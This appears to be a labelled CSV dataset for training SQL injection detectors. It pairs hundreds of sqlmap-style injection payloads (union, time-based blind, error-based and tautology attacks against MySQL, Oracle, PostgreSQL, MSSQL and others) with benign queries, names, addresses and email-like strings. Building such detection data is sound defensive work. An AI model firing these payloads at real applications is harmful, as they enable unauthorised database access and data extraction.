Query,Label
"   SELECT anybody, rough+ ', ' + wide+ ' ' + laid+ ', ' + folks AS yet  FROM clay",0
delito,0
"1""   (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )   and ""cbck"" like ""cbck",1
"1"" and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )  ",1
"1%'   )    )    union all select null,null,null,null--",1
SELECT * FROM  ( SELECT fight FROM roll ) ,0
"c/ ciudadela 188, 4?f",0
SELECT * FROM everyone WHERE pond IN  ( SELECT either FROM average ) ,0
SELECT * FROM storm WHERE damage = 'married'  OR cattle = 'pipe',0
monforte del cid,0
SELECT measure ( s )  FROM yard UNION,0
19140,0
frades,0
3553,0
wildt_feng-chiao@paseotuperro.ke,0
"-8612'  )   as toeu where 6357  =  6357 or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --",1
9ig7a2i4,0
"   SELECT COUNT ( roar ) , first FROM scientific BY to",0
doan7,0
1 and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     ) ,1
"   )    )    or benchmark  (  10000000,MD5  (  1   )    )   #",1
SELECT * FROM discover WHERE sun = 'carefully' LIMIT 3,0
"-1033 union all select 8731,8731,8731,8731,8731,8731--",1
SELECT * FROM throat ORDER BY cake DESC,0
SELECT * FROM sharp WHERE seed = 'within' LIMIT 3,0
 -- &password  = ,1
lecompte,0
"1'   )    )    as jvwq where 6596  =  6596 and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1
6861,0
"1%'   )    )     )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and    (    (     (  '%'  =  '",1
minera dauns,0
SELECT COUNT ( grown ) FROM moment,0
"1""   )    )    as czzg where 5483  =  5483 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --",1
42141,0
"1"" and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and ""gxhz""  =  ""gxhz",1
"1  )   where 9059  =  9059 and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   --",1
SELECT national ( s ) FROM dug INNER JOIN,0
"1""   )    )     )   union all select null,null,null,null,null#",1
arvizu tirapu,0
"-4954%""  )   or 5244  =  4832",1
"INSERT INTO laugh ( ants, increase, youth, fight, breath, pride )  VALUES  ( 'rough', 'freedom'. victory', 'hardly', 'took', 'standard', 'easier' )  ",0
SELECT * FROM spread ORDER BY say,0
SELECT * FROM couple WHERE herself  BETWEEN 10 AND 20,0
SELECT TOP 50 PERCENT * FROM thy,0
"-7941%'  )   union all select 6965,6965,6965,6965--",1
 AND 1  =  utl_inaddr.get_host_address   (    (   SELECT global_name FROM global_name   )    )    AND 'i'  =  'i,1
SELECT ISNULL ( 350 ) ;,0
carpool,0
"1""   )    )    as ccjk where 1932  =  1932 or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1
SELECT * FROM  ( SELECT western FROM plant ) ,0
"1""  )   and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (  ""hbfr"" like ""hbfr",1
SELECT DEGREES ( PI (  ) *2 ) ;,0
1'  )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and   (  'brob'  =  'brob,1
danis,0
-3339' or 8571  =  8571--,1
9639,0
if  (  2697  =  2008  )   select 2697 else drop function jcoo--,1
25727,0
d76en3r9n8z01,0
SELECT * FROM corn WHERE bite BETWEEN 'at' AND 'share',0
rombeek,0
1%'   )    )    rlike sleep  (  5  )   and    (    (   '%'  =  ',1
1'  )   as uaoz where 2464  =  2464,1
SELECT earn ( s )  FROM good,0
"1%""  )   and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and   (  ""%""  =  """,1
SELECT * FROM ship WHERE sea BETWEEN '1996-07-01' AND '1996-07-31',0
3.68572E+15,0
darrieu@redstarz.sv,0
SELECT column_names FROM table_name WHERE column_name IS NOT NULL;,0
"1  )   or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1
"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and '%'  =  '",1
modigh,0
humfrid,0
SELECT * FROM raw WHERE term = 'entirely' FETCH FIRST 3 ROWS ONLY,0
belia,0
SELECT Count ( * )  AS just,0
jamaly,0
"1' where 5023  =  5023 and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1
SELECT * FROM  ( SELECT paid FROM cook ) ,0
SELECT TOP 50 PERCENT * FROM hidden SELECT * FROM labor FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM pictured,0
SELECT help ( s )  FROM particular,0
SELECT DISTINCT impossible FROM breathing,0
"1'   )    )     )   or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (     (  'bfrq' like 'bfrq",1
"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  ""unju""  =  ""unju",1
cunillera penades,0
"-4817 union all select 7415,7415,7415,7415,7415,7415,7415,7415,7415#",1
SELECT rock FROM carbon UNION SELECT oil FROM home ORDER BY independent,0
"SELECT * FROM gas WHERE dollar BETWEEN ""giant"" AND    ""graph""",0
"1""  )   as bpmk where 4506  =  4506",1
"   SELECT being,older,distance,nobody,building     (  (  tin JOIN reach ON again.noise =  lost.appropriate )   INNER JOIN aliveON Orders.buried =  speech.grandfatherID ) ",0
SELECT white ( s )  FROM clearly SELECT excitement ( s ) ,0
17751,0
en9r195d9,0
"  SELECT castle,skin FROM double WHERE root = 'duty' UNION SELECT water, studying FROM nation",0
levi@coivoco.gr,0
-7633'  )   as aslj where 2317  =  2317 or 8571  =  8571--,1
SELECT * FROM everyone FETCH FIRST 50 PERCENT ROWS ONLY,0
SELECT * FROM shake ORDER BY jar DESC,0
SELECT AVG ( buy ) FROM equally SELECT SUM ( interior ) ,0
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 287 )  ORDER BY meta_id ASC",0
SELECT * FROM wild WHERE NOT sleep = 'halfway'  AND NOT union = 'create',0
"c/ academia, 59, 3?g",0
SELECT COUNT ( luck ) FROM off,0
"-1512 union all select 9013,9013,9013,9013#",1
SELECT TOP 50 PERCENT * FROM chamber SELECT * FROM land FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM triangle,0
-1769 union all select 6054--,1
SELECT angle ( s )  FROM identity FULL OUTER JOIN,0
SELECT shot ( s )  FROM height SELECT noun FROM zero,0
SELECT * FROM  ( SELECT special FROM duty ) ,0
SELECT * FROM perfect WHERE consider IN  ( SELECT cast FROM bat ) ,0
SELECT AVG ( crack ) FROM lost SELECT SUM ( paper ) ,0
"1   )    )    as shmg where 1371  =  1371 union all select null,null,null,null,null,null,null,null,null,null#",1
SELECT * FROM record WHERE connected LIKE '%inch%',0
SELECT option_value FROM wp_options WHERE option_name  =  '_options_facebook_url' LIMIT 1,0
@variable,1
1'  )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and   (  'svwr'  =  'svwr,1
" select * from users where id  =  '1' +   (  \  )   union select 1,@@VERSION -- 1'",1
1%'   )    )    rlike   (  select   (  case when   (  6094  =  7893  )   then 1 else 0x28 end   )    )    and    (    (   '%'  =  ',1
SELECT * FROM  ( SELECT rain FROM lion ) ,0
"INSERT INTO simple ( darkness, ice, joy, loose, instead, settle )  VALUES  ( 'scale', 'clean'. therefore', 'necessary', 'want', 'loss', 'earn' )  ",0
SELECT * FROM verb WHERE pay = 'thee' FETCH FIRST 3 ROWS ONLY,0
"1%'   )    )    and elt  (  1210  =  1210,sleep  (  5   )    )    and    (    (   '%'  =  '",1
"-8893%'   )    )    or elt  (  1032  =  1032,3623  )   and    (    (   '%'  =  '",1
enchufe,0
"1'||  (  select 'svgd' from dual where 5188  =  5188 union all select null,null,null,null,null#",1
"-7485%'   )    )     )   union all select 1303,1303,1303,1303,1303,1303,1303,1303,1303--",1
" SELECT * FROM sold ORDER BY should ASC, simple DESC",0
SELECT * FROM friend WHERE were NOT LIKE '[seed]%',0
"1"" or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   ",1
" SELECT column_name ( s )  FROM mighty,amount",0
SELECT * FROM design WHERE every = 'line',0
card patrn,0
-6890'   )    )    or 5771  =  7721--,1
"INSERT INTO silly  ( respect, receive, circle )  VALUES  ( 'nodded', 'statement', 'beauty' )  ",0
"diamante, 114,",0
"-3856""  )   as iyzl where 7394  =  7394 or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --",1
"1' in boolean mode  )   union all select null,null,null,null,null,null,null,null,null#",1
-9340  )   where 5462  =  5462 or 3038  =  3038,1
SELECT minerals ( s )  FROM folks LEFT JOIN,0
c7o5ologa,0
"-3933'   )    )     )   union all select 6198,6198,6198,6198,6198#",1
"1'   )    )     )   or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and    (    (     (  'ochr' like 'ochr",1
 AND 1  =  utl_inaddr.get_host_address   (    (   SELECT COUNT  (  DISTINCT  (  table_name   )    )    FROM sys.all_tables   )    )    AND 'i'  =  'i,1
jose cadalso s/n 7d,0
"-7378' union all select 2071,2071,2071,2071,2071,2071,2071--",1
-8404   )    )    order by 1--,1
"select * from generate_series  (  3086,3086,case when   (  3086  =  3327  )   then 1 else 0 end  )   limit 1--",1
faix,0
SELECT AVG ( wrote )  FROM composition  SELECT SUM ( wore ) ,0
select * from users where id  =  1 <@.$ or 1  =  1 -- 1,1
SELECT how,0
SELECT becoming ( s )  FROM terrible UNION,0
SELECT * FROM point,0
"-5243"" where 2105  =  2105 or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  --",1
SELECT COUNT ( motion )  FROM topic,0
"1""   )    )     )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and    (    (     (  ""uncg""  =  ""uncg",1
"SELECT wp_posts.ID FROM wp_posts WHERE 1 = 1 AND wp_posts.post_type  =  'acf-field' AND   (  (  wp_posts.post_status  =  'publish'  )  )   AND wp_posts.post_name  =  'field_5f6c888b6771b' ORDER BY wp_posts.menu_order ASC, wp_posts.post_title ASC LIMIT 0, 1",0
rudie@deuxmanagement.jo,0
"admin"" #",1
"-4596"" union all select 5761#",1
d6ntrotr566,0
"  SELECT chooseID AS ID, president AS grabbed FROM value",0
SELECT CHAR_LENGTH ( CustomerName )  AS LengthOfName FROM Customers;,0
selj@ebaz.travel,0
"SELECT wp_posts.ID FROM wp_posts WHERE 1 = 1 AND wp_posts.post_type  =  'acf-field' AND   (  (  wp_posts.post_status  =  'publish'  )  )   AND wp_posts.post_name  =  'field_5f72e0bae01c0' ORDER BY wp_posts.menu_order ASC, wp_posts.post_title ASC LIMIT 0, 1",0
8.92715E+15,0
SELECT * FROM worse ORDER BY its,0
SELECT * FROM reader WHERE will = 'boat'  AND  ( bare = 'vote' OR no = 'continued' ) ,0
SELECT AVG ( general )  FROM one  SELECT SUM ( cold ) ,0
2095,0
SELECT COUNT ( DISTINCT breeze )  FROM mean,0
SELECT well ( s )  FROM nothing LEFT JOIN,0
SELECT MIN ( create )  AS rate FROM ago,0
1  )   as mixt where 1085  =  1085 or sleep  (  5  )  --,1
emesh,0
torres de berrelln,0
64633352v,0
"1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #",1
"SELECT 'Supplier', ContactName, City, Country FROM Suppliers;",0
65931091g,0
"azorin, 167",0
SELECT MIN ( boy )  AS who FROM speech,0
"1'   )    )     )   or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",1
1'+  (  select 'vjoj' where 5348  =  5348,1
"1""   )    )    as tsry where 6594  =  6594 or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )  --",1
SELECT * FROM shore,0
" SELECT * FROM show ORDER BY fellow ASC, wall DESC",0
"1""   )    )    union all select null,null,null,null#",1
"INSERT INTO vote ( flat, trap, card, score, correctly, law )  VALUES  ( 'market', 'chose'. zero', 'within', 'gas', 'waste', 'screen' )  ",0
SELECT AVG ( pen ) FROM sand SELECT SUM ( maybe ) ,0
"1%' union all select null,null--",1
1'||  (  select 'gdzt' where 4950  =  4950,1
mallat paiva,0
SELECT AVG ( Price ) FROM him,0
pi,0
"-6184""   )    )    or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   ""rovr""  =  ""rovr",1
"1""  )   where 1700  =  1700 union all select null,null,null,null,null#",1
"1   )    )    as xebl where 3105  =  3105 or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1
"1' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and 'yaje'  =  'yaje",1
SELECT * FROM bar WHERE Price NOT BETWEEN 10 AND 20,0
SELECT * FROM question WHERE car = 'yard' FETCH FIRST 3 ROWS ONLY,0
entrala,0
SELECT color FROM perhaps,0
DELETE FROM garden WHERE closer = 'entire',0
"1%""   )    )     )   union all select null,null,null,null,null,null,null,null,null,null#",1
"1'   )    )    procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (   'bacm'  =  'bacm",1
" select * from users where id  =  1 or 1#""; union select version  (    )  ,version  (    )   -- 1",1
29056,0
" SELECT * FROM quarter ORDER BY sold ASC, flew DESC",0
SELECT * FROM nothing WHERE treated BETWEEN '1996-07-01' AND '1996-07-31',0
SELECT TOP 3 * FROM enter SELECT * FROM social 3SELECT * FROM water,0
6.34351E+15,0
"1%'  )   or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and   (  '%'  =  '",1
SELECT * FROM limited FETCH FIRST 3 ROWS ONLY,0
SELECT COUNT ( sport ) FROM wore,0
"-6550'  )   where 1675  =  1675 union all select 1675,1675,1675,1675,1675,1675,1675--",1
1'  )   as nexa where 6740  =  6740,1
alfonso.julissa@naturalchild.tk,0
copleston-guerrasio@risiberia.ng,0
espinosa@chicashumedas.net,0
"1' where 4417  =  4417 and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )  --",1
syamala,0
"SELECT YEAR ( ""2017-06-15 09:34:21"" ) ;",0
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 55203 )  ORDER BY meta_id ASC",0
juan,0
e5670cij3,0
SELECT MIN ( importance )  AS health FROM log,0
"1%""   )    )    and 2006  =  2006",1
SELECT COUNT ( active ) FROM block,0
"calle juana ibarborou 134,",0
"travesia doctor sanchez, 139, 12?h",0
"1   )    )    as xutu where 5811  =  5811 or char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1
"INSERT INTO base ( baseball, hunter, freedom, physical, top, corner )  VALUES  ( 'mass', 'tide'. that', 'meat', 'food', 'maybe', 'seed' )  ",0
SELECT TOP 3 * FROM seldom WHERE fresh = 'piano',0
"   SELECT Employees.laugh, COUNT ( Orders.orderID )  AS globeFROM    ( OrdersINNER JOIN generally ON Orders.mayID  =  Employees.meltedID ) ",0
"  SELECT reach,pictured,model FROM shoot LEFT JOIN Orders ON wet.noonID =  record.lift ORDER BY pick.safety",0
prdica,0
SELECT * FROM snow WHERE brick BETWEEN 'how' AND 'has',0
baigent@blueberryminiloaf.com.dj,0
1%' and 7533  =  7533 and '%'  =  ',1
27113,0
"caridad 82,",0
SELECT * FROM near WHERE carefully = 'way' LIMIT 3,0
1'||  (  select 'lxyu' from dual where 5789  =  5789 union all select null#,1
SELECT * FROM nearer WHERE sitting = 'upward'  AND  ( tree = 'list' OR rope = 'body' ) ,0
SELECT castle,0
"1'   (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )   and 'hqqj'  =  'hqqj",1
-6405%'   )    )     )   or   (  8459  =  8459  )  *4906 and    (    (     (  '%'  =  ',1
" select * from users where id  =  1 or "".;"" or 1  =  1 -- 1",1
62386870z,0
2169,0
4.47104E+15,0
"c/ los rosales 166, 6f",0
SELECT wp_posts.* FROM wp_posts WHERE ID IN  ( 367535 ) ,0
"-8344 or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  -- wjpa",1
re681g48rdia,0
"INSERT INTO blood ( meal, each, term, mental, heard, smaller )  VALUES  ( 'her', 'help'. pure', 'develop', 'tell', 'bone', 'constantly' )  ",0
"  SELECT surfaceID AS ID, should AS immediately FROM afternoon",0
97728451w,0
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 9053 )  ORDER BY meta_id ASC",0
SELECT WEEKOFYEAR ( CURDATE (   )  )  ;,0
8.9713E+15,0
1'||  (  select 'vuku' where 3143  =  3143 waitfor delay '0:0:5'--,1
"1"" where 1051  =  1051 union all select null--",1
SELECT * FROM family WHERE national = 'note'  OR her = 'burn',0
SELECT COUNT ( DISTINCT community )  FROM journey,0
poblacin de arroyo,0
"1' procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )  ",1
"1'+  (  select 'midn' where 2819  =  2819 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3   )    )   +'",1
vilamasa pacheca,0
"   SELECT book,wool,available,middle,lesson     (  (  money JOIN composition ON refused.scientific =  wherever.onto )   INNER JOIN baseballON Orders.mainly =  took.indicateID ) ",0
"  SELECT * FROM club WHERE tell NOT IN  ( 'has', 'merely', 'practice' )  ",0
SELECT * FROM nearly WHERE    NOT find = 'add',0
remberta,0
SELECT * FROM standard FETCH FIRST 50 PERCENT ROWS ONLY,0
persaud,0
3.59196E+15,0
cotizada,0
steinar,0
8217,0
"-1203""   )    )    or 8571  =  8571--",1
 or a  =  a--,1
17536,0
-7962'   )    )    as pgqz where 6058  =  6058 or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   --,1
"select sleep  (  5  )   and    (    (   ""%""  =  """,1
"-1083%""   )    )     )   or elt  (  1032  =  1032,3623  )   and    (    (     (  ""%""  =  """,1
-7786'   )    )    or 9323  =  9323#,1
29491,0
"1' and make_set  (  8403  =  8403,8899  )   and 'niux'  =  'niux",1
SELECT rose ( s FROM own RIGHT JOIN,0
"-5161%"" or   (  1437  =  4869  )  *4869 and ""%""  =  """,1
"1""  )   and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1
"1,  (  case when 8260  =  8260 then 1 else null end  )  ",1
SELECT AVG ( Price ) FROM effort,0
SELECT * FROM  ( SELECT theory FROM machinery ) ,0
1 where 8102  =  8102 and 9198  =  9198--,1
demarco_phuong@beesmer.me,0
"1%""   )    )    and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (   ""%""  =  """,1
SELECT column_name FROM table_name WHERE ROWNUM < =  number ;,0
ransell,0
char%4039%41%2b%40SELECT,1
"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and   (  'cixa' like 'cixa",1
SELECT creature ( s )  FROM where UNION ALL,0
1.56766E+14,0
SELECT * FROM example WHERE castle NOT BETWEEN 'silly' AND 'addition',0
tunaroza capmany,0
SELECT * FROM made WHERE Price NOT BETWEEN 10 AND 20,0
"  SELECT create,bottom FROM pretty WHERE familiar = 'play' UNION SELECT tower, opinion FROM go",0
SELECT * FROM start WHERE something IN  ( SELECT toy FROM blue ) ,0
"1""   )    )    and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and    (    (   ""mxnj"" like ""mxnj",1
DELETE FROM enemy,0
1'   )    )    rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,1
SELECT * FROM metal WHERE carry BETWEEN 'discovery' AND 'national',0
"   SELECT opportunity, ear, potFROM fat WHERE four  IS NOT NULL",0
"SELECT wp_posts.ID FROM wp_posts WHERE 1 = 1 AND wp_posts.post_type  =  'acf-field' AND   (  (  wp_posts.post_status  =  'publish'  )  )   AND wp_posts.post_name  =  'field_5fc54784b64dd' ORDER BY wp_posts.menu_order ASC, wp_posts.post_title ASC LIMIT 0, 1",0
"INSERT INTO solution ( swung, pencil, cup, welcome, those, unhappy )  VALUES  ( 'impossible', 'pen'. title', 'weak', 'front', 'judge', 'sets' )  ",0
"1"" union all select null,null,null--",1
$amarulencia,0
jia,0
"calle olivos de pea nevada, 124,",0
SELECT * FROM fifteen WHERE stopped = 'rising' LIMIT 3,0
SELECT hay ( s )  FROM congress UNION,0
"  SELECT examine,coffee FROM short WHERE aside = 'notice' UNION SELECT triangle, nor FROM sets",0
"SELECT wp_posts.ID FROM wp_posts WHERE 1 = 1 AND wp_posts.post_type  =  'acf-field' AND   (  (  wp_posts.post_status  =  'publish'  )  )   AND wp_posts.post_name  =  'field_5f6c881b67715' ORDER BY wp_posts.menu_order ASC, wp_posts.post_title ASC LIMIT 0, 1",0
29%,1
SELECT * FROM hand WHERE fire BETWEEN motor09/01/1996yesterday AND policeman15/31/1996industrial,0
denia,0
SELECT block,0
1'+  (  select vfmy where 5711  =  5711,1
"calle santander, 0,",0
chicon merlo,0
"calle godelleta, s/n",0
"1""  )   where 1107  =  1107 and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1
SELECT * FROM typical ORDER BY official,0
chirlern,0
"1'   )    )    or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and    (    (   'stqq'  =  'stqq",1
berleand@campanasextractoras.la,0
duchement tenza,0
"1'  )   and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1
"1%' union all select null,null,null,null,null,null,null,null,null,null--",1
61877469v,0
"1%""  )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and   (  ""%""  =  """,1
1   )    )    as eveb where 7567  =  7567,1
SELECT COUNT ( seven ) FROM mother,0
jauregui cortines,0
SELECT * FROM including ORDER BY establish,0
SELECT ProductName FROM Products WHERE ProductID  =  ALL,0
waitfor delay '0:0:5'#,1
getulio,0
"1""  )   where 1833  =  1833",1
" SELECT POSITION ( ""a"" IN CustomerName )  FROM Customers;",0
"  SELECT placeID AS ID, fix AS held FROM early",0
"-7939""  )   or 3958  =  6909",1
santa eufemia del arroyo,0
"-5082   )    )    union all select 4013,4013,4013,4013,4013,4013,4013,4013,4013,4013#",1
"1""   )    )    procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (   ""rtyu"" like ""rtyu",1
"1 or elt  (  5873  =  5873,sleep  (  5   )    )   #",1
"-1678"" where 3706  =  3706 or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --",1
SELECT * FROM news WHERE again NOT LIKE 'important%',0
SELECT * FROM shoot WHERE anyone = 'signal'  OR count = 'rear',0
SELECT * FROM finally WHERE silk = 'six'  OR jet = 'rhyme',0
1525,0
"-9884'  )   or elt  (  1942  =  8409,8409  )   and   (  'tqdq' like 'tqdq",1
"zoma, la",0
